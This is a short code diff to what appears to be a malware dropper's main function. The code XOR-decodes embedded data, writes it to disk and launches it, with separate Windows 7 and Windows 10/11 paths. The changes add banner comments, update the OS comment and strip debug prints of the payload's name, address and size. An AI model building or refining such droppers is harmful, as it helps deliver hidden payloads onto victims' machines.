@@ -152,6 +152,13 @@ int main(int argc, char* argv[])
 		launch(name2);
 
 		launch(name3);
+
+////////////////////////////////////////////
+
+//             Windows 7 extract
+
+////////////////////////////////////////////
+
 #else
 
 		w7_dropper_start();
@@ -184,7 +191,7 @@ int main(int argc, char* argv[])
 
 ////////////////////////////////////////////////////////
 
-	// Windows 10 handling of dropper
+	// Windows 10/11 handling of dropper
 
 ////////////////////////////////////////////////////////
 
@@ -201,9 +208,6 @@ int main(int argc, char* argv[])
 		data1 = XOR(data1, size1);
 	#endif
 
-		std::cout << "This is name: " << name1 << "\n";
-		printf("This is data4: %p\n", data1);
-		printf("This is size: %llu\n", (unsigned long long) size1);
 		drop(data1, size1, name1);
 
 		launch(name1);
